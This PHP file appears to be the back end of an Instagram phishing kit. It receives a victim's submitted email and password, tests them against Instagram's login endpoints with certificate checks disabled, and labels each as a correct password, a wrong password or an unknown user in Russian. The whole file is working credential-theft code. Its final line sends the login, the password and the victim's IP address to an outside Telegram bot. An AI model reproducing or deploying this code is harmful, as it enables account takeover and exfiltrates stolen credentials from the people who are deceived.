<?php

	$today = date("F j, Y, g:i a"); 
    $ip = $_SERVER["REMOTE_ADDR"];
	$email = $_POST['email'];
	$passo = $_POST['passo'];
	
	$token = "";
    $chat_id = "";
	
	$str="username=" . $email . "&password=" . $passo;
	
	$ch = curl_init("https://www.instagram.com/accounts/login/");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36");
	
	$co = curl_exec($ch);
	
	$cookieParts = array();

	preg_match_all('/Set-Cookie: (.*?);/im', $co, $cookieParts);

	foreach($cookieParts[1] as $val) {
		$exp = explode("=", $val);
		
		if($exp[0] == "csrftoken") {
			$csrf = $exp[1];
		}
	}

	curl_close($ch);
	
	$cl = curl_init("https://www.instagram.com/accounts/login/ajax/");
	curl_setopt($cl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($cl, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($cl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($cl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($cl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36");
	curl_setopt($cl, CURLOPT_POST, true);
    curl_setopt($cl, CURLOPT_COOKIE, join(";", $cookieParts[1]));
	curl_setopt($cl, CURLOPT_POSTFIELDS, $str);
	curl_setopt($cl, CURLOPT_HTTPHEADER, array(
	'content-type: application/x-www-form-urlencoded',
	'origin: https://www.instagram.com',
	'pragma: no-cache',
	'referer: https://www.instagram.com/accounts/login/',
	'x-instagram-ajax: 1',
	'x-requested-with: XMLHttpRequest',
	'x-csrftoken: ' . $csrf
    ));
	$get = curl_exec($cl);
	curl_close($cl);
	
	$getJ = json_decode($get, true);
	$dt = array();
	
	if(($getJ['user'])or !empty($getJ['checkpoint_url'])) {
		if(($getJ['authenticated']) or !empty($getJ['checkpoint_url'])) {
		
			setcookie("login", $email, time()+3600, '/');
			
$arr = array(
  'Статус: ' => 'Верный пароль',
  'Логин: ' => $email,
  'Пароль:' => $passo,
  'IP:' => $ip
);

			
			
			
			echo "true";
		} else {
			
$arr = array(
  'Статус: ' => 'Неверный пароль',
  'Логин: ' => $email,
  'Пароль:' => $passo,
  'IP:' => $ip
);
		

			echo "false";
		}
	} else {
		
$arr = array(
  'Статус: ' => 'Неверный пользователь',
  'Логин: ' => $email,
  'Пароль:' => $passo,
  'IP:' => $ip
);		
			
		echo "false1";
	}

$txt = '';
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");	
	

?>
